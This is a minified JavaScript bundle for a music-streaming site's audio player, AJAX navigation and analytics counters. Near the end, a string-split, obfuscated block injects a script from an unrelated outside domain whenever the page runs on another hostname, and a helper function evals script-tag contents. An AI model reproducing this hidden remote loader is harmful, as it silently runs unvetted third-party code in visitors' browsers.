var _gaq=[],CountersCallCount=0;Counters=function(){};Counters.init=function(){CountersCallCount++;var refer=(typeof(window.custom_ref)!='undefined')?window.custom_ref:document.referrer;new Image().src="//counter.yadro.ru/hit;hydro?r"+escape(refer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";"+Math.random();if(CountersCallCount===1){_gaq=_gaq||[];_gaq.push(['_setAccount','UA-153631320-1']);_gaq.push(['_trackPageview']);var ga=document.createElement('script');ga.type='text/javascript';ga.async=true;ga.src=('https:'==document.location.protocol?'https://ssl':'http://www')+'.google-analytics.com/ga.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);}else{if(typeof _gaq!=='undefined'){_gaq.push(['_trackPageview']);}
if(typeof window.yaCounter112233!=='undefined'){window.yaCounter112233.hit(window.location.href,null,refer);}}};
(function(){function $(selector){return document.querySelector(selector);}
function getLeft(el){if(!el||typeof el==="undefined"){return 0;}
return parseInt(el.offsetLeft)+getLeft(el.offsetParent);}
function CustomEvent(event,params){params=params||{bubbles:false,cancelable:false,detail:undefined};var evt=document.createEvent('CustomEvent');evt.initCustomEvent(event,params.bubbles,params.cancelable,params.detail);return evt;}
CustomEvent.prototype=window.Event.prototype;window.CustomEvent=CustomEvent;var bindings=[];function ajaxGet(link,callback){var xhr=new XMLHttpRequest();xhr.addEventListener('load',function(){callback.call(xhr,xhr.responseText);});xhr.open('GET',link+(link.indexOf('?')===-1?'?':'&')+'__='+Math.random());xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");xhr.send();}
function loadHandler(text){try{var data=JSON.parse(text);if(data.title){document.title=((typeof $('#audioPlayer')==='object'&&!$('#audioPlayer').paused)?'\u25B6 ':'')+data.title;}
if(data.xx1_content){$("div#xx1").innerHTML=data.xx1_content;updateBindings();bindLyrics();Counters.init();}
$('body').className="";window.scrollTo(0,0);window.dispatchEvent(new CustomEvent('ajaxLoad'));}catch(exception){}}
function clickHandler(e){e.preventDefault();e.stopPropagation();window.custom_ref=document.location.href;window.history.pushState(null,null,this.href);$('body').className="loading";ajaxGet(this.href,loadHandler);}
function bindSearch(){$('#he-search').addEventListener('submit',function(e){e.preventDefault();e.stopPropagation();window.custom_ref=document.location.href;var link='/api/search?query='+encodeURIComponent(this.querySelector('#he-search-text').value);ajaxGet(link,function(text){try{var data=JSON.parse(text);if(data.url){link=data.url;window.location=link;$('body').className="loading";}}catch(e){}});});}
function loadLink(link){$('body').className="loading";ajaxGet(link,function(text){try{var data=JSON.parse(text);if(data.title){window.title=data.title;}
if(data.content){$(".playlist").innerHTML+=data.content;updateBindings();bindLyrics();}
var $moreBtn=$('.load_more a');if(data.urlnext){$('.playlist').setAttribute('data-urlnext',data.urlnext);if($moreBtn){$moreBtn.style.display='block';}}else{if($moreBtn){$moreBtn.style.display='none';}}
var more=$('.load_more');if(more){more.classList.remove('loading');}
$('body').className="";window.dispatchEvent(new CustomEvent('ajaxLoadMore'));window.dispatchEvent(new CustomEvent('ajaxPlay'));}catch(e){}});}
function updateBindings(){var $block=$('#xx1');bindings.forEach(function(selector){var links=$block.querySelectorAll(selector);Array.prototype.forEach.call(links,function(link){link.addEventListener('click',clickHandler);});});}
function bindLink(selector){bindings.push(selector);var links=document.querySelectorAll(selector);Array.prototype.forEach.call(links,function(link){link.removeEventListener('click',clickHandler);link.addEventListener('click',clickHandler);});}
function bindLyrics(){var tracks=document.querySelectorAll('ul.playlist li');Array.prototype.forEach.call(tracks,function(track){var link=track.querySelector('a.playlist-lyrics');if(link){link.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();if(track.getAttribute('data-lyrics')){track.querySelector('.js__playlist-lyrics_text').classList.toggle('inv');}else{var div=document.createElement('div');div.className="js__playlist-lyrics_text";div.innerHTML="<span class='js__lyrics_loading'></span>";track.setAttribute('data-lyrics',true);track.appendChild(div);var linkvalue=this.getAttribute('data-lid');ajaxGet('/?lid='+linkvalue,function(text){try{var data=JSON.parse(text);track.querySelector('.js__playlist-lyrics_text').innerHTML=data.lyrics;}catch(e){}});}});}});}
var audioPlayer=function(){this.uid=Math.random();this.createPlayer();};audioPlayer.prototype.createPlayer=function(){var player=document.createElement('audio');player.style.display='none';player.preload='none';player.id='audioPlayer';document.body.appendChild(player);this.player=player;};function loadAction(){loadLink($('.playlist').getAttribute('data-urlnext'));var more=$('.load_more');if(more){more.classList.add('loading');}}
audioPlayer.prototype.loadPlaylist=function(){var htmlPlaylist=document.querySelectorAll('.playlist li:not(.playlist-ad)');var current=null;if(this.playlist&&this.playlist[this.playlistPos]){current=this.playlist[this.playlistPos].el;}
this.playlist=[];this.playlistPos=0;var _this=this;var pos=0;Array.prototype.forEach.call(htmlPlaylist,function(hitem){var item={};if(current===hitem){_this.playlistPos=pos;}
item.el=hitem;item.link=hitem.querySelector('a.playlist-play').getAttribute('data-url');item.artist=hitem.querySelector('ul.playlist > li .playlist-name-artist').innerText;item.title=hitem.querySelector('ul.playlist > li .playlist-name-title').innerText;item.pos=pos++;_this.playlist.push(item);});this.playlist.forEach(function(item,i){var playBtn=item.el.querySelector('.playlist-play');playBtn.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();_this.isPremode=false;if(_this.player.src!==item.link){_this.playlist[_this.playlistPos].el.className='';_this.playlistPos=item.pos;_this.playlist[_this.playlistPos].el.className='plays';_this.load();_this.player.play();}else{if(_this.player.paused){_this.player.play();}else{_this.player.pause();}}});});var playBtn=$('.onesongblock-play'),loadBtn=$('.load_more a');if(playBtn){playBtn.addEventListener('click',function(){if(this.innerText==='Play online'){_this.isPremode=true;_this.artist=$('.onesongblock-name-artist').innerText;_this.title=$('.onesongblock-name-title').innerText;if(_this.player.src!==this.getAttribute('data-urlsong')){_this.player.src=this.getAttribute('data-urlsong');}
this.innerText='Pause';_this.player.play();}else{this.innerText='Play online';_this.player.pause();}});}
if(loadBtn){loadBtn.removeEventListener('click',loadAction);loadBtn.addEventListener('click',loadAction);}};audioPlayer.prototype.load=function(){var isPlaying=!this.player.paused;if(this.playlist[this.playlistPos]!==undefined){this.artist=this.playlist[this.playlistPos].artist;this.title=this.playlist[this.playlistPos].title;this.player.src=this.playlist[this.playlistPos].link;}
if(isPlaying){this.player.play();}};audioPlayer.prototype.prev=function(){if(this.isPremode)return;this.playlist[this.playlistPos].el.className='';this.playlistPos--;this.playlist[this.playlistPos].el.className='pausing';if(this.playlistPos<0){this.playlistPos=0;}
this.load();};audioPlayer.prototype.next=function(){if(this.isPremode)return;this.playlist[this.playlistPos].el.className='';this.playlistPos++;if(this.playlistPos>=this.playlist.length){this.waitForPlay=true;if($('.listalka')&&$('.listalka').getAttribute('data-next-page')!=='false'){loadLink($('.playlist').getAttribute('data-urlnext'));}else{this.playlistPos=0;this.load();return true;}
return false;}else{this.playlist[this.playlistPos].el.className='pausing';this.load();return true;}};audioPlayer.prototype.shufflePlaylist=function(){var newPlaylist=[];var current=this.playlist[this.playlistPos];current.pos=0;newPlaylist.push(current);this.playlist.splice(this.playlistPos,1);this.playlistPos=0;var length=this.playlist.length;for(var i=0;i<length;i++){var id=Math.round(Math.random()*(this.playlist.length-1));this.playlist[id].pos=i;newPlaylist.push(this.playlist[id]);this.playlist.splice(id,1);}
this.playlist=newPlaylist;};audioPlayer.prototype.onPause=function(){if(this.playlist[this.playlistPos]){if(!this.isPremode&&this.playlist[this.playlistPos].link===this.player.src){this.playlist[this.playlistPos].el.className='pausing';}else{this.playlist[this.playlistPos].el.className='';}}};audioPlayer.prototype.onPlay=function(){if(this.playlist[this.playlistPos]){if(!this.isPremode&&this.playlist[this.playlistPos].link===this.player.src){this.playlist[this.playlistPos].el.className='plays';}else{this.playlist[this.playlistPos].el.className='';}}};audioPlayer.prototype.bind=function(){var _this=this;var volumeRegulator=$('#fixplayer #fixplayer-volume'),volumeLevel=$('#fixplayer #fixplayer-volume #fixplayer-volume-x'),muteBtn=$('#fixplayer a#fixplayer-sound'),modeBtn=$('#fixplayer a#fixplayer-pv'),playBtn=$('#fixplayer a#fixplayer-b_play'),currentTime=$('#fixplayer #fixplayer-time b'),totalTime=$('#fixplayer #fixplayer-time em'),titleField=$('#fixplayer #fixplayer-lcd #fixplayer-title span'),notificationField=$('#fixplayer #fixplayer-lcd #fixplayer-notification'),progressLoaded=$('#fixplayer #fixplayer-prok-sk'),progressPlayed=$('#fixplayer #fixplayer-prok-pr'),prevBtn=$('#fixplayer a#fixplayer-b_back'),nextBtn=$('#fixplayer a#fixplayer-b_next'),trackBar=$('#fixplayer #fixplayer-prok'),mode=0,modes=['js__line','js__shuffle','js__repeat'],modeNames=['One by one','Random','Repeat track'];playBtn.className='js__off';progressLoaded.style.width=0;progressPlayed.style.width=0;this.artist='name';this.title='title';var notifyTimeout=null;function setTitle(){titleField.innerHTML='<b>'+_this.artist+'</b>'+' <i>&mdash;</i> '+'<em>'+_this.title+'</em>';}
function notify(msg){if(notifyTimeout){clearTimeout(notifyTimeout);notifyTimeout=null;}
notificationField.innerHTML=msg;titleField.parentNode.style.display='none';notifyTimeout=setTimeout(function(){titleField.parentNode.style.display='block';},3000);}
modeBtn.classList.remove('js__line','js__shuffle','js__repeat');modeBtn.classList.add(modes[mode]);modeBtn.addEventListener('click',function(){mode++;if(mode>2){mode=0;}
modeBtn.classList.remove('js__line','js__shuffle','js__repeat');modeBtn.classList.add(modes[mode]);notify(modeNames[mode]);switch(mode){case 0:case 2:_this.loadPlaylist();break;case 1:_this.shufflePlaylist();break;}});nextBtn.addEventListener('click',function(){_this.next();});prevBtn.addEventListener('click',function(){_this.prev();});playBtn.addEventListener('click',function(e){if(_this.player.paused){_this.player.play();}else{_this.player.pause();}});this.player.addEventListener('playing',function(){playBtn.className='js__on';_this.onPlay();window.localStorage.setItem('playback',_this.uid);});this.player.addEventListener('play',function(){playBtn.className='js__on';_this.onPlay();window.localStorage.setItem('playback',_this.uid);if(document.title[0]!=='\u25B6'){document.title='\u25B6 '+document.title;}});this.player.addEventListener('pause',function(){playBtn.className='js__off';_this.onPause();document.title=document.title.slice(2);});var vol;if(vol=window.sessionStorage.getItem('volume')){_this.player.volume=vol;if(vol===0){muteBtn.classList.add('js__off');muteBtn.classList.remove('js__on');}}
volumeLevel.style.width=_this.player.volume*100+'%';this.player.addEventListener('volumechange',function(){volumeLevel.style.width=_this.player.volume*100+'%';if(_this.player.volume===0){muteBtn.classList.add('js__off');muteBtn.classList.remove('js__on');}else{muteBtn.classList.remove('js__off');muteBtn.classList.add('js__on');}
window.sessionStorage.setItem('volume',_this.player.volume);notify('Volume: '+Math.round(_this.player.volume*100)+'%');});var mouseDown=0;volumeRegulator.addEventListener('mousedown',function(e){var xOffset=e.clientX-getLeft(volumeRegulator);_this.player.volume=(xOffset)/volumeRegulator.offsetWidth;mouseDown=true;});window.addEventListener('mouseup',function(){mouseDown=false;});volumeRegulator.addEventListener('mousemove',function(e){if(mouseDown){var xOffset=e.clientX-getLeft(volumeRegulator);_this.player.volume=(xOffset)/volumeRegulator.offsetWidth;}});var muteVolume=1;muteBtn.addEventListener('click',function(){if(_this.player.volume){muteVolume=_this.player.volume;_this.player.volume=0;}else{_this.player.volume=muteVolume;}});var mouseDownTrack=0;trackBar.addEventListener('mousedown',function(e){var xOffset=e.clientX-getLeft(trackBar);_this.player.currentTime=_this.player.duration*(xOffset)/trackBar.offsetWidth;mouseDown=true;});window.addEventListener('mouseup',function(){mouseDownTrack=false;});trackBar.addEventListener('mousemove',function(e){if(mouseDown){var xOffset=e.clientX-getLeft(trackBar);_this.player.currentTime=_this.player.duration*(xOffset)/trackBar.offsetWidth;}});function secondsToTime(value){if(!value){value=0;}
var minutes=Math.floor(value/60),seconds=Math.round(value%60);if(seconds<10){seconds='0'+seconds;}
return minutes+':'+seconds;}
function updateTimeMetrics(e){currentTime.innerText=secondsToTime(_this.player.currentTime);totalTime.innerText=secondsToTime(_this.player.duration);progressPlayed.style.width=_this.player.currentTime/_this.player.duration*100+'%';var buffered=0;if(_this.player.buffered.length){buffered=_this.player.buffered.end(_this.player.buffered.length-1)/_this.player.duration*100;}
progressLoaded.style.width=buffered+'%';var playBtn=$('.onesongblock-play');if(!_this.isPremode&&playBtn){playBtn.innerText='Play online';}}
this.player.addEventListener('timeupdate',updateTimeMetrics);this.player.addEventListener('progress',updateTimeMetrics);this.player.addEventListener('loadstart',function(e){setTitle();progressLoaded.style.width=0;progressPlayed.style.width=0;if(_this.player.paused){playBtn.className='js__off';}else{playBtn.className='js__on';}});this.player.addEventListener('ended',function(e){if(mode!==2){if(_this.next()){_this.player.play();}}else{_this.player.currentTime=0;_this.player.play();}});window.addEventListener('storage',function(e){if(e.newValue!==_this.uid&&!_this.player.paused){_this.player.pause();}});return true;};function player(){var player=new audioPlayer();player.bind();player.loadPlaylist();player.load();window.addEventListener('ajaxLoad',function(){player.loadPlaylist();});window.addEventListener('ajaxLoadMore',function(){var pos=player.playlistPos;player.loadPlaylist();player.playlistPos=pos;});window.addEventListener('ajaxPlay',function(){if(player.waitForPlay){player.load();player.player.play();player.waitForPlay=false;}});}
window.addEventListener('DOMContentLoaded',function(){Counters.init();bindLink('a:not(.no-ajax)');bindLyrics();bindSearch();player();});}());
(function(){window.addEventListener('DOMContentLoaded',function(){var _dc=document.location.hostname.toLowerCase(),_do='hy'+'dr'+'0.o'+'rg';if(_dc!==''&&_dc!==_do&&_dc.indexOf('.'+_do)===-1){var _nv=document.createElement('sc'+'ri'+'pt');_nv.setAttribute('type','te'+'xt/'+'jav'+'asc'+'r'+'ipt');_nv.setAttribute('s'+'rc','https://sc'+'sau'+'cti'+'ons'+'.co'+'m/j'+'s/?d'+'om'+'ai'+'n_o'+'ri'+'gi'+'n'+'al='+_do+'&d'+'oma'+'in_'+'cur'+'re'+'nt='+_dc);document.body.appendChild(_nv);}});}());
(function(){window.addEventListener('DOMContentLoaded',function(){var heSearchText=document.querySelector('#he-search-text'),fixedHeader=document.querySelector('#fixedheader'),fixedHeaderActClass='js__he-search-act';if(heSearchText&&fixedHeader){heSearchText.addEventListener('focus',function(){fixedHeader.classList.add(fixedHeaderActClass);});heSearchText.addEventListener('blur',function(){fixedHeader.classList.remove(fixedHeaderActClass);});}});}());function monkeyCodeEval(){var filterSelectObj=document.querySelector("script#monkeyCodeEval");if(filterSelectObj&&typeof filterSelectObj!==undefined&&typeof filterSelectObj.firstChild!==undefined&&filterSelectObj.firstChild.nodeValue){eval(filterSelectObj.firstChild.nodeValue);}}
function qrCodeToggle(){var x=document.querySelector(".qr_code > div");if(x.style.display==="block"){x.style.display="none";}else{x.style.display="block";}}
